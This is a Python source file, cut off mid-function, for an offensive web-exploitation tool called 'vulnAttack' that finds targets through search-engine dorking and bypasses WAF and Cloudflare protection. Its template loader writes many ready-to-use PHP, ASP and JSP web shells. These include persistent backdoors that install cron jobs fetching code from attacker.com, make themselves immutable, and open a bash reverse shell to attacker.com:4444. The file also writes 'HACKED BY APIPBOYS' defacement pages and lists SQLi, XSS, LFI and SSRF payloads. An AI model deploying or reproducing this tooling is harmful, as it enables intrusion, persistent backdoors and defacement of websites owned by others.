#!/usr/bin/env python3
# ================================================================
# vulnAttack - Full Exploit Chain Engine v3.0 FINAL
# Author    : Apipboys
# Support   : Termux | Kali | Windows | macOS | Docker
# ================================================================

import os
import sys
import re
import time
import json
import random
import base64
import urllib.parse
import subprocess
import logging
from urllib.parse import urlparse, quote, parse_qs, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product

# ================================================================
# LOGGING
# ================================================================
log_dir = 'logs'
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
logging.basicConfig(
    filename=os.path.join(log_dir, 'vulnAttack.log'),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ================================================================
# DEPENDENSI & AUTO-INSTALL
# ================================================================
try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

# ================================================================
# INTEGRASI MODUL BYPASS
# ================================================================
try:
    from bypass import CloudflareBypass, WAFBypass, CaptchaSolver, HeaderManager, Utils
    BYPASS_MODULE_AVAILABLE = True
except ImportError:
    BYPASS_MODULE_AVAILABLE = False
    # Fallback dummy classes
    class HeaderManager:
        def __init__(self, *args, **kwargs): pass
        def get_headers(self, *args, **kwargs): return {}
        def get_random_ua(self): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    class WAFBypass:
        def __init__(self, *args, **kwargs): pass
        def detect(self, *args, **kwargs): return False
        def retry_on_block(self, func, *args, **kwargs): return func(*args, **kwargs)
        def bypass_payload(self, payload, category='sqli'): return [payload]
    class Utils:
        @staticmethod
        def load_bypass_settings(*args, **kwargs): return {"bypass": {"waf": {"max_retries": 3}}}
        @staticmethod
        def random_delay(min_delay, max_delay, randomize): return random.uniform(min_delay, max_delay)
        @staticmethod
        def load_user_agents(*args, **kwargs): return []
    class CloudflareBypass:
        def __init__(self, *args, **kwargs): self.scraper = None
        def request(self, *args, **kwargs): return None
    class CaptchaSolver:
        def __init__(self, *args, **kwargs): pass
        def solve_recaptcha(self, *args, **kwargs): return None
        def solve_image_captcha(self, *args, **kwargs): return None

# ================================================================
# BANNER
# ================================================================
BANNER = """
\033[91m
  _   _         _          ___   _    _                 _    
 | | | |       | |        / _ \\ | |  | |               | |   
 | | | | _   _ | | _ __  / /_\\ \\| |_ | |_   __ _   ___ | | __
 | | | || | | || || '_ \\ |  _  || __|| __| / _` | / __|| |/ /
 \\ \\_/ /| |_| || || | | || | | || |_ | |_ | (_| || (__ |   < 
  \\___/  \\__,_||_||_| |_|\\_| |_/ \\__| \\__| \\__,_| \\___||_|\\_\\
\033[96m
\033[92m[+] Author  : Apipboys
[+] Version : 3.0 FINAL (STABLE)
[+] Payload : 140.000+ (14 kategori x 10000+)
[+] Support : Termux | Kali | Windows | macOS | Docker
[+] Bypass  : Cloudflare | WAF | Header Rotation | Rate Limit
\033[93m[+] Status  : READY TO USE
\033[0m
"""

def print_progress(msg, status='info'):
    t = datetime.now().strftime('%H:%M:%S')
    c = {
        'info': '\033[96m[+]\033[0m',
        'success': '\033[92m[✓]\033[0m',
        'warning': '\033[93m[!]\033[0m',
        'error': '\033[91m[✗]\033[0m',
        'progress': '\033[95m[~]\033[0m',
        'vuln': '\033[91m[💀]\033[0m'
    }.get(status, '\033[96m[+]\033[0m')
    print(f"\033[94m[{t}]\033[0m {c} {msg}")
    logging.info(f"{status.upper()} - {msg}")

def print_section(title):
    print(f"\n\033[93m{'='*60}\033[0m")
    print(f"\033[96m  {title}\033[0m")
    print(f"\033[93m{'='*60}\033[0m")
    logging.info(f"SECTION - {title}")

# ================================================================
# KONFIGURASI
# ================================================================
def load_user_agents():
    ua_file = 'config/user_agents.txt'
    if os.path.exists(ua_file):
        with open(ua_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
    ]

CONFIG = {
    'timeout': 15,
    'threads': 10,
    'max_depth': 5,
    'delay': 1,
    'max_links': 50,
    'output_dir': 'results',
    'payload_dir': 'payloads',
    'template_dir': 'templates',
    'user_agents': load_user_agents(),
    'dork_sources': {
        'google': 'https://www.google.com/search?q={dork}&start={start}',
        'bing': 'https://www.bing.com/search?q={dork}&first={start}',
        'duckduckgo': 'https://html.duckduckgo.com/html/?q={dork}&s={start}'
    }
}

def load_proxies():
    proxy_file = 'config/proxy.txt'
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def load_bypass_settings():
    try:
        if BYPASS_MODULE_AVAILABLE:
            return Utils.load_bypass_settings('config/bypass_settings.json')
    except:
        pass
    return {"bypass": {"waf": {"max_retries": 3, "retry_delay": 5}, "delay": {"min": 1, "max": 3, "randomize": True}}}

# ================================================================
# DESKRIPSI SERANGAN
# ================================================================
ATTACK_DESCRIPTIONS = {
    'sqli': """
[+] SQL Injection (SQLi)
[+] Technique: Error-based, Union-based, Time-based Blind, Boolean-based Blind
[+] Payload examples:
    - ' OR 1=1--
    - ' UNION SELECT NULL--
    - ' AND SLEEP(5)--
[+] Description: Injecting malicious SQL queries through user input to manipulate database.
""",
    'xss': """
[+] Cross-Site Scripting (XSS)
[+] Technique: Reflected, Stored, DOM-based
[+] Payload examples:
    - <script>alert(1)</script>
    - <img src=x onerror=alert(1)>
    - javascript:alert(1)
[+] Description: Injecting client-side scripts into web pages viewed by other users.
""",
    'lfi': """
[+] Local File Inclusion (LFI)
[+] Technique: Path traversal, Null byte injection, Double encoding
[+] Payload examples:
    - ../../../../etc/passwd
    - ../../../../etc/passwd%00
    - ../../../../etc/passwd%2500
[+] Description: Reading local files on the server by manipulating file paths.
""",
    'rce': """
[+] Remote Code Execution (RCE)
[+] Technique: Command injection, PHP code injection, eval injection
[+] Payload examples:
    - ; id
    - <?php system($_GET['cmd']); ?>
    - | whoami
[+] Description: Executing arbitrary commands on the server.
""",
    'ssrf': """
[+] Server-Side Request Forgery (SSRF)
[+] Technique: Internal IP access, Port scanning, Protocol smuggling
[+] Payload examples:
    - http://127.0.0.1
    - http://169.254.169.254/latest/meta-data/
    - gopher://localhost:80/_GET /
[+] Description: Forcing the server to make requests to internal resources.
""",
    'xxe': """
[+] XML External Entity (XXE)
[+] Technique: File read, SSRF, Denial-of-service
[+] Payload examples:
    - <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
[+] Description: Exploiting XML parsers to read files or access internal networks.
""",
    'nosqli': """
[+] NoSQL Injection
[+] Technique: Operator injection ($ne, $gt, $or), JavaScript injection
[+] Payload examples:
    - username[$ne]=admin
    - password[$gt]=a
[+] Description: Bypassing NoSQL database queries using special operators.
""",
    'ssti': """
[+] Server-Side Template Injection (SSTI)
[+] Technique: Template engine abuse (Jinja2, Twig, Freemarker)
[+] Payload examples:
    - {{ 7*7 }}
    - {{ config }}
    - <%= system('id') %>
[+] Description: Injecting malicious template code to execute system commands.
""",
    'cmd_injection': """
[+] Command Injection
[+] Technique: Shell meta-characters, command chaining, output redirection
[+] Payload examples:
    - ; id
    - | whoami
    - && ls
[+] Description: Injecting operating system commands through unsanitized input.
""",
    'ldap': """
[+] LDAP Injection
[+] Technique: Filter injection, Wildcard abuse
[+] Payload examples:
    - (uid=*)
    - (&(uid=admin)(userPassword=*))
[+] Description: Manipulating LDAP queries to bypass authentication or extract data.
""",
    'open_redirect': """
[+] Open Redirect
[+] Technique: URL redirection without validation
[+] Payload examples:
    - //evil.com
    - https://malicious.com
[+] Description: Redirecting users to external malicious sites.
""",
    'csrf': """
[+] Cross-Site Request Forgery (CSRF)
[+] Technique: Missing anti-CSRF tokens, weak token validation
[+] Payload examples:
    - No CSRF token in forms
    - Missing CSRF header
[+] Description: Forcing authenticated users to perform unintended actions.
""",
    'file_upload': """
[+] File Upload
[+] Technique: Extension bypass, MIME type spoofing, Double extension
[+] Payload examples:
    - shell.php
    - shell.php.jpg
    - shell.gif.php
[+] Description: Uploading malicious files to gain remote access.
""",
    'directories': """
[+] Directory Traversal / Listing
[+] Technique: Path traversal, Directory brute-forcing
[+] Payload examples:
    - admin
    - backup/
    - tmp/
[+] Description: Accessing directories that should be restricted.
"""
}

# ================================================================
# PAYLOAD LOADER
# ================================================================
class PayloadLoader:
    def __init__(self):
        self.payloads = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def load_all(self):
        if not os.path.exists(CONFIG['payload_dir']):
            print_progress("Payload folder not found. Creating...", 'warning')
            os.makedirs(CONFIG['payload_dir'], exist_ok=True)

        files = [f for f in os.listdir(CONFIG['payload_dir']) if f.endswith('.txt')]
        if not files:
            print_progress("No payload files found!", 'warning')
            if os.path.exists('generate_payloads.py'):
                print_progress("Do you want to generate payloads automatically? (y/n): ", 'info')
                choice = input().strip().lower()
                if choice == 'y':
                    print_progress("Running generator... This may take a few minutes.", 'info')
                    try:
                        subprocess.run([sys.executable, 'generate_payloads.py'], check=True)
                        print_progress("Payload generation completed.", 'success')
                    except Exception as e:
                        print_progress(f"Failed to generate payloads: {e}", 'error')
                        print_progress("Please run 'python generate_payloads.py' manually.", 'warning')
                        sys.exit(1)
                else:
                    print_progress("Please run generate_payloads.py manually.", 'error')
                    sys.exit(1)
            else:
                print_progress("generate_payloads.py not found. Please make sure it exists.", 'error')
                sys.exit(1)

        for f in os.listdir(CONFIG['payload_dir']):
            if f.endswith('.txt'):
                key = f.replace('.txt', '')
                self.payloads[key] = self.load_file(os.path.join(CONFIG['payload_dir'], f))
        if not self.payloads:
            print_progress("No payloads loaded!", 'error')
            sys.exit(1)
        total = sum(len(v) for v in self.payloads.values())
        print_progress(f"Loaded {total} payloads", 'success')

    def get(self, category, limit=None):
        payloads = self.payloads.get(category, [])
        return payloads[:limit] if limit else payloads

# ================================================================
# TEMPLATE LOADER
# ================================================================
class TemplateLoader:
    def __init__(self):
        self.templates = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        return None

    def _write_template(self, path, content):
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    def load_all(self):
        if not os.path.exists(CONFIG['template_dir']):
            os.makedirs(CONFIG['template_dir'], exist_ok=True)

        webshells = {
            'webshell_basic.php': '<?php system($_GET["cmd"]); ?>',
            'webshell_advanced.php': '<?php error_reporting(0); if(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "vulnAttack Web Shell";} ?>',
            'webshell_mini.php': '<?php eval($_GET["c"]); ?>',
            'webshell_b64.php': '<?php if(isset($_GET["cmd"])){system(base64_decode($_GET["cmd"]));} ?>',
            'webshell_encoder.php': '<?php if(isset($_GET["cmd"])){system(urldecode($_GET["cmd"]));} ?>',
            'webshell_backdoor.php': '<?php $cmd=isset($_GET["cmd"])?$_GET["cmd"]:(isset($_POST["cmd"])?$_POST["cmd"]:"");if($cmd){system($cmd);} ?>',
            'webshell_persistent.php': '<?php if(!file_exists("shell_backup.php")){file_put_contents("shell_backup.php",\'<?php system($_GET["cmd"]); ?>\');}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_silent.php': '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]." > /dev/null 2>&1 &");} ?>',
            'webshell_encrypted.php': '<?php if(isset($_GET["cmd"])){$cmd=base64_decode($_GET["cmd"]);system($cmd);} ?>',
            'webshell_obfuscated.php': '<?php $c=$_GET["cmd"];$c=str_rot13($c);system($c); ?>',
            'webshell_hidden.php': '<?php if($_SERVER["HTTP_USER_AGENT"]=="vulnAttack"){system($_GET["cmd"]);} ?>',
            'webshell_cgi.php': '#!/usr/bin/php\n<?php system($_SERVER["QUERY_STRING"]); ?>',
            'webshell_asp.asp': '<% Response.Write CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll() %>',
            'webshell_jsp.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'webshell_py.py': '#!/usr/bin/env python3\nimport os,sys\nos.system(sys.argv[1])',
            'webshell_super.php': '<?php // super shell ?>',
            'webshell_encoder_plus.php': '<?php if(isset($_GET["cmd"])){$c=urldecode(base64_decode($_GET["cmd"]));system($c);} ?>',
            'webshell_persistent_plus.php': '<?php $backups=["/tmp/shell.php","/var/tmp/shell.php"];foreach($backups as $b){if(!file_exists($b)){file_put_contents($b,\'<?php system($_GET["cmd"]); ?>\');}}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_obfuscated_plus.php': '<?php $c=$_GET["cmd"];$c=strrev(base64_decode(str_rot13($c)));system($c); ?>',
            'webshell_hidden_plus.php': '<?php $ua=$_SERVER["HTTP_USER_AGENT"];$ip=$_SERVER["REMOTE_ADDR"];if($ua=="vulnAttack"||$ip=="127.0.0.1"){system($_GET["cmd"]);} ?>',
            'webshell_extreme_persistent.php': '<?php $secret="x9F#2mQ!7kL$5pR*";if(!isset($_GET["key"])||$_GET["key"]!==$secret)die("Access Denied");if(isset($_GET["cmd"])){system($_GET["cmd"]);exit;}$dirs=["/tmp/","/var/tmp/","/dev/shm/","/home/","/root/","/var/www/html/","/var/www/","/usr/share/","/opt/","/var/log/"];foreach($dirs as $d){if(is_writable($d)){copy(__FILE__,$d."system_core.php");if(PHP_OS!=="WINNT"){chmod($d."system_core.php",0777);}}}if(PHP_OS!=="WINNT"){$cron_cmd="*/5 * * * * php ".realpath(__FILE__)."?key=$secret&cmd=wget -q -O /tmp/backdoor.php http://attacker.com/backdoor.php";file_put_contents("/tmp/cron_job",$cron_cmd);system("crontab /tmp/cron_job 2>/dev/null");system("chattr +i ".__FILE__." 2>/dev/null");}$backup_files=["/tmp/backup_shell.php","/var/tmp/backup_shell.php"];foreach($backup_files as $bf){if(!file_exists($bf)){file_put_contents($bf,file_get_contents(__FILE__));}}$htaccess=\'Options -Indexes\\n<FilesMatch "\\\\.(php|phtml)$">\\nOrder Deny,Allow\\nDeny from all\\n</FilesMatch>\';file_put_contents(".htaccess",$htaccess);if(isset($_GET["revshell"])){system("bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"");}if(isset($_GET["download"])){readfile($_GET["download"]);}if($_SERVER["REQUEST_METHOD"]==="POST"&&isset($_FILES["file"])){move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);} ?>',
            'webshell_super_hidden.php': '<?php $rand=substr(md5(rand()),0,8);$name=$rand.".php";if(!file_exists($name)){copy(__FILE__,$name);unlink(__FILE__);header(\'Location: \'.$name);exit;}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_immunity.php': '<?php $backups=["/tmp/immune1.php","/tmp/immune2.php","/var/tmp/immune.php"];foreach($backups as $b){if(!file_exists($b)){file_put_contents($b,file_get_contents(__FILE__));}}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_cron_agent.php': '<?php if(PHP_OS!=="WINNT"){if(!file_exists("/tmp/agent.php")){file_put_contents("/tmp/agent.php",file_get_contents(__FILE__));}$cron_job="*/5 * * * * php /tmp/agent.php?cmd=wget -q -O /tmp/shell.php http://attacker.com/shell.php";system("echo \\"$cron_job\\" | crontab -");}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_stealth_encoder.php': '<?php $key="x9F#2mQ!7kL$5pR*";if(isset($_GET["cmd"])){$c=base64_decode($_GET["cmd"]);$out="";for($i=0;$i<strlen($c);$i++){$out.=chr(ord($c[$i])^ord($key[$i%strlen($key)]));}system($out);} ?>'
        }
        for fname, content in webshells.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path) and content:
                self._write_template(path, content)

        defaces = {
            'deface_basic.html': '<h1 style="color:red;text-align:center;margin-top:20%;">HACKED BY APIPBOYS</h1>',
            'deface_advanced.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:black;color:red;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;">HACKED</h1><p style="font-size:30px;">Hacked by Apipboys</p><p>Security is an illusion</p></body></html>',
            'deface_cyber.html': '<!DOCTYPE html><html><head><title>CYBER ATTACK</title></head><body style="background:#0a0a0a;color:#00ff00;text-align:center;padding-top:15%;font-family:\'Courier New\',monospace;"><h1 style="font-size:100px;color:red;text-shadow:0 0 20px red;">CYBER ATTACK</h1><h2>HACKED BY APIPBOYS</h2><p>System Compromised</p></body></html>',
            'deface_hacker.html': '<!DOCTYPE html><html><head><title>HACKER</title></head><body style="background:#111;color:#0f0;text-align:center;padding-top:10%;font-family:\'Courier New\',monospace;"><div style="font-size:60px;animation:pulse 2s infinite;">[ HACKER ]</div><h1 style="color:red;">HACKED</h1><h2>By Apipboys</h2><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}</style></body></html>',
            'deface_glitch.html': '<!DOCTYPE html><html><head><title>GLITCH</title></head><body style="background:black;color:#0f0;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;"><h1 style="font-size:80px;animation:glitch 1s infinite;">GLITCH</h1><p>Hacked by Apipboys</p><style>@keyframes glitch{0%{text-shadow:2px 0 red,-2px 0 blue}50%{text-shadow:-2px 0 red,2px 0 blue}100%{text-shadow:2px 0 red,-2px 0 blue}}</style></body></html>',
            'deface_matrix.html': '<!DOCTYPE html><html><head><title>MATRIX</title></head><body style="background:black;color:#00ff00;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;overflow:hidden;"><pre style="font-size:12px;opacity:0.1;position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;">01001000 01000001 01000011 01001011 01000101 01000100</pre><h1 style="color:red;">HACKED</h1><p>Apipboys</p></body></html>',
            'deface_minimal.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:20%;"><h1>HACKED</h1><p>Apipboys</p></body></html>',
            'deface_neon.html': '<!DOCTYPE html><html><head><title>NEON</title></head><body style="background:#000;color:#ff00ff;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;text-shadow:0 0 20px #ff00ff,0 0 40px #ff00ff;">NEON</h1><p style="color:#00ffff;text-shadow:0 0 10px #00ffff;">Hacked by Apipboys</p></body></html>',
            'deface_retro.html': '<!DOCTYPE html><html><head><title>RETRO</title></head><body style="background:#000;color:#ff6b6b;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;border:5px solid #ff6b6b;height:80vh;margin:5%;"><h1 style="font-size:60px;">HACKED</h1><p>By Apipboys</p></body></html>'
        }
        for fname, content in defaces.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path):
                self._write_template(path, content)

        if os.path.exists('index.html'):
            dest = os.path.join(CONFIG['template_dir'], 'deface_apip.html')
            if not os.path.exists(dest):
                with open('index.html', 'r', encoding='utf-8') as src:
                    with open(dest, 'w', encoding='utf-8') as dst:
                        dst.write(src.read())

        for root, _, files in os.walk(CONFIG['template_dir']):
            for f in files:
                full = os.path.join(root, f)
                key = os.path.relpath(full, CONFIG['template_dir'])
                content = self.load_file(full)
                if content:
                    self.templates[key] = content
        print_progress(f"Loaded {len(self.templates)} templates", 'success')

# ================================================================
# HTTP ANALYZER
# ================================================================
class HTTPAnalyzer:
    def __init__(self, session):
        self.session = session
        self.headers = {}
        self.cookies = {}
        self.forms = []
        self.ajax = []
        self.websockets = []
        self.api_endpoints = []
        self.parameters = set()
        self.hidden_inputs = []
        self.hidden_buttons = []
        self.hidden_divs = []
        self.comments_sensitive = []
        self.js_endpoints = []
        self.css_links = []
        self.meta_tags = {}
        self.is_directory_listing = False
        self.csrf_protected = False

    def analyze(self, url, response):
        if not response:
            return {}
        self.headers = dict(response.headers)
        self.cookies = self.session.cookies.get_dict()
        html = response.text

        self.hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*>', html)
        self.hidden_buttons = re.findall(r'<button[^>]*(?:display\s*:\s*none|type=["\']hidden["\'])[^>]*>', html)
        self.hidden_divs = re.findall(r'<div[^>]*(?:display\s*:\s*none|visibility\s*:\s*hidden|aria-hidden=["\']true["\'])[^>]*>', html)

        self.comments_sensitive = []
        for match in re.finditer(r'<!--(.*?)-->', html, re.DOTALL):
            comment = match.group(1).strip()
            if any(k in comment.lower() for k in ['password', 'token', 'api', 'key', 'secret', 'admin', 'user', 'login', 'db_', 'pass', 'credential']):
                self.comments_sensitive.append(comment[:200])

        forms_with_csrf = re.findall(r'<form[^>]*>.*?(csrf|token|_token).*?</form>', html, re.DOTALL)
        self.forms = re.findall(r'<form[^>]*>', html)
        self.csrf_protected = bool(forms_with_csrf)

        self.ajax = re.findall(r'fetch\s*\(\s*["\']([^"\']+)', html)
        self.ajax += re.findall(r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)', html)

        self.websockets = re.findall(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)', html)

        self.api_endpoints = re.findall(r'/api/[a-zA-Z0-9/_-]+', html)
        self.api_endpoints += re.findall(r'/v[0-9]+/[a-zA-Z0-9/_-]+', html)

        params = parse_qs(urlparse(url).query)
        self.parameters.update(params.keys())
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html)
        self.parameters.update(inputs)

        self.meta_tags = dict(re.findall(r'<meta\s+name=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html))
        self.meta_tags.update(dict(re.findall(r'<meta\s+content=["\']([^"\']+)["\']\s+name=["\']([^"\']+)["\']', html)))

        js_files = re.findall(r'<script[^>]*src=["\']([^"\']+\.js)["\']', html)
        self.js_endpoints = [urljoin(url, js) for js in js_files]

        css_files = re.findall(r'<link[^>]*href=["\']([^"\']+\.css)["\']', html)
        self.css_links = [urljoin(url, css) for css in css_files]

        self.is_directory_listing = bool(re.search(r'<title>Index of /', html) or re.search(r'<h1>Index of /', html))

        return {
            'headers': self.headers,
            'cookies': self.cookies,
            'forms': len(self.forms),
            'csrf_protected': self.csrf_protected,
            'hidden_inputs': self.hidden_inputs,
            'hidden_buttons': len(self.hidden_buttons),
            'hidden_divs': len(self.hidden_divs),
            'sensitive_comments': self.comments_sensitive[:5],
            'ajax': list(set(self.ajax))[:10],
            'websockets': list(set(self.websockets))[:5],
            'api_endpoints': list(set(self.api_endpoints))[:20],
            'parameters': list(self.parameters)[:30],
            'js_files': self.js_endpoints[:10],
            'css_files': self.css_links[:10],
            'meta_tags': self.meta_tags,
            'is_directory_listing': self.is_directory_listing,
            'status_code': response.status_code,
            'content_type': response.headers.get('Content-Type', ''),
            'server': response.headers.get('Server', '')
        }

# ================================================================
# MINOR VULNERABILITY ANALYZER
# ================================================================
class MinorVulnAnalyzer:
    def __init__(self, headers, cookies, html, url):
        self.headers = headers
        self.cookies = cookies
        self.html = html
        self.url = url
        self.findings = []

    def analyze(self):
        print_progress("Scanning minor vulnerabilities...", 'progress')
        xfo = self.headers.get('X-Frame-Options', '')
        if not xfo:
            self.findings.append({'type':'Missing X-Frame-Options','severity':'Medium','description':'X-Frame-Options header missing. Potential clickjacking risk.'})
        elif xfo.upper() not in ['DENY','SAMEORIGIN']:
            self.findings.append({'type':'Weak X-Frame-Options','severity':'Low','description':f'X-Frame-Options: {xfo}'})

        csp = self.headers.get('Content-Security-Policy', '')
        if not csp:
            self.findings.append({'type':'Missing CSP','severity':'Medium','description':'CSP header missing. Increased XSS risk.'})
        elif "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
            self.findings.append({'type':'Weak CSP','severity':'Medium','description':'CSP uses unsafe-inline or unsafe-eval.'})

        if not self.headers.get('Strict-Transport-Security', ''):
            self.findings.append({'type':'Missing HSTS','severity':'Low','description':'HSTS header missing.'})

        for name, attrs in self.cookies.items():
            if isinstance(attrs, dict):
                if not attrs.get('HttpOnly'):
                    self.findings.append({'type':'Cookie Missing HttpOnly','severity':'Medium','description':f'Cookie "{name}" missing HttpOnly.'})
                if not attrs.get('Secure'):
                    self.findings.append({'type':'Cookie Missing Secure','severity':'Low','description':f'Cookie "{name}" missing Secure.'})
                if not attrs.get('SameSite'):
                    self.findings.append({'type':'Cookie Missing SameSite','severity':'Low','description':f'Cookie "{name}" missing SameSite.'})

        if self.headers.get('Server'):
            self.findings.append({'type':'Server Info Leak','severity':'Low','description':f'Server: {self.headers["Server"]}'})
        if self.headers.get('X-Powered-By'):
            self.findings.append({'type':'Tech Info Leak','severity':'Low','description':f'X-Powered-By: {self.headers["X-Powered-By"]}'})

        if 'phpinfo' in self.html.lower() or 'php_version' in self.html.lower():
            self.findings.append({'type':'PHP Info Exposure','severity':'High','description':'PHP info page exposed.'})

        if 'Index of /' in self.html:
            self.findings.append({'type':'Directory Listing','severity':'Medium','description':'Directory listing enabled.'})

        return self.findings

# ================================================================
# DORK ENGINE
# ================================================================
class DorkEngine:
    def __init__(self, session, header_manager):
        self.session = session
        self.sources = CONFIG['dork_sources']
        self.results = {}
        self.header_manager = header_manager

    def _request(self, url):
        try:
            headers = self.header_manager.get_headers(random_ua=True)
            return self.session.get(url, headers=headers, timeout=CONFIG['timeout'])
        except Exception:
            return None

    def _extract_urls(self, html, source):
        urls = []
        patterns = {
            'google': r'<a href="\/url\?q=(.*?)&amp;',
            'bing': r'<a href="(.*?)".*?class="tilk"',
            'duckduckgo': r'<a rel="nofollow" class="result__a" href="(.*?)"'
        }
        pattern = patterns.get(source, r'<a href="(.*?)"')
        for match in re.finditer(pattern, html):
            url = match.group(1)
            if 'http' in url and 'google' not in url and source not in url:
                if url.startswith('/url?q='):
                    url = url.replace('/url?q=', '').split('&')[0]
                if url.startswith('http'):
                    urls.append(url)
        return list(set(urls))

    def dork(self, dork, source='google', max_results=50):
        print_section(f"DORKING WITH {source.upper()}")
        print_progress(f"Source: {source.upper()} | Dork: {dork}", 'info')
        results = []
        base_url = self.sources.get(source)
        if not base_url:
            print_progress(f"Source {source} not supported!", 'error')
            return results
        pages = max_results // 10 + (1 if max_results % 10 > 0 else 0)
        for page in range(pages):
            start = page * 10
            url = base_url.format(dork=quote(dork), start=start)
            print_progress(f"Page {page+1}/{pages} - Scraping...", 'progress')
            r = self._request(url)
            if not r or r.status_code != 200:
                print_progress(f"Page {page+1} failed, stopping.", 'warning')
                break
            urls = self._extract_urls(r.text, source)
            results.extend(urls)
            sleep_time = random.uniform(3, 7)
            print_progress(f"Sleeping {sleep_time:.1f}s to avoid rate-limit...", 'progress')
            time.sleep(sleep_time)
        self.results[source] = list(set(results))[:max_results]
        print_progress(f"{source.upper()}: Found {len(self.results[source])} targets", 'success')
        return self.results[source]

    def dork_all(self, dork, max_results=50):
        print_section("MULTI-DORKING")
        print_progress(f"Dork: {dork}", 'info')
        all_results = []
        for source in self.sources.keys():
            results = self.dork(dork, source, max_results // len(self.sources))
            all_results.extend(results)
            time.sleep(2)
        all_results = list(set(all_results))
        print_progress(f"Total unique targets: {len(all_results)}", 'success')
        return all_results

# ================================================================
# MAIN SCANNER (DIPERBAIKI)
# ================================================================
class VulnAttack:
    def __init__(self, target, payload_loader, template_loader, use_proxy=False, bypass_waf=False, attack_category=None):
        self.target = target
        self.base_url = self._get_base_url()
        self.domain = urlparse(target).netloc
        self.payloads = payload_loader
        self.templates = template_loader
        self.use_proxy = use_proxy
        self.bypass_waf = bypass_waf
        self.attack_category = attack_category
        self.sqli_vuln = None

        self.bypass_settings = load_bypass_settings()
        self.header_manager = HeaderManager(user_agents=CONFIG['user_agents'])
        self.waf_bypass = WAFBypass(
            max_retries=self.bypass_settings.get('bypass', {}).get('waf', {}).get('max_retries', 3),
            retry_delay=self.bypass_settings.get('bypass', {}).get('waf', {}).get('retry_delay', 5)
        )
        if self.bypass_waf and CLOUDSCRAPER_AVAILABLE:
            self.cloudscraper_session = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                delay=CONFIG.get('delay', 1)
            )
        else:
            self.cloudscraper_session = None

        self.session = requests.Session()
        if use_proxy:
            proxies = load_proxies()
            if proxies:
                self.session.proxies = {
                    'http': random.choice(proxies),
                    'https': random.choice(proxies)
                }
                print_progress(f"Using proxy: {self.session.proxies['http']}", 'info')

        self.vulns = []
        self.minor_vulns = []
        self.scanned_urls = set()
        self.shell_url = None
        self.deface_url = None
        self.analyzer = HTTPAnalyzer(self.session)
        self.deep_report = {}
        self.hidden_findings = {}
        self.dork_engine = DorkEngine(self.session, self.header_manager)
        self.last_request_time = 0
        self.last_html = ""
        self.dump_data = {}

    def _get_base_url(self):
        p = urlparse(self.target)
        return f"{p.scheme}://{p.netloc}"

    def _random_ua(self):
        return self.header_manager.get_random_ua()

    def _request(self, url, method='GET', **kwargs):
        delay = CONFIG.get('delay', 1)
        now = time.time()
        if now - self.last_request_time < delay:
            time.sleep(delay - (now - self.last_request_time))
        self.last_request_time = time.time()

        headers = self.header_manager.get_headers(random_ua=True)
        if 'headers' in kwargs:
